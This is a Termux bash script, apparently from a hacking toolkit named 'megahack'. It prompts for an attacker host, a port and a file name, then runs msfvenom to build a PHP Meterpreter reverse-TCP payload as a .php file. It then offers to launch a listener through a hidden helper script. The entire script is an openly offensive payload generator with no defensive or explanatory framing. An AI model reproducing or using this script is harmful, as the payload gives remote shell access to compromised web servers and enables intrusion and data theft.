#!/data/data/com.termux/files/usr/bin/bash
clear
figlet PHP | lolcat -t
figlet Payload | lolcat -t
echo " "
echo " "
tput setaf 1; echo "LHOST"
echo " "
read lhost
echo " "
tput setaf 2; echo "LPORT "
echo " "
read lport
echo " " 
tput setaf 3; echo "FILE NAME"
echo " "
read file
echo " "
msfvenom -p php/meterpreter_reverse_tcp lhost="$lhost" LPORT="$lport" -f raw > $HOME/megahack/output/Php/"$file".php && tput setaf 2; echo " PAYLOAD GENERATED SUCCESSFULLY"
echo " "
tput setaf 4; echo "PRESS INTER TO CONTINUE"
read nov
clear
figlet PHP | lolcat -t
figlet Payload | lolcat -t
echo " "
echo " "
tput setaf 2; echo " [1] Start Listner"
echo " "
tput setaf 1; echo " [2] Exit"
echo " "
read task
if [ "2" = "$task" ]
then
	cd $HOME/megahack && bash megahack
else
	cd $HOME/megahack/.l/.php && bash ."$task".sh
fi
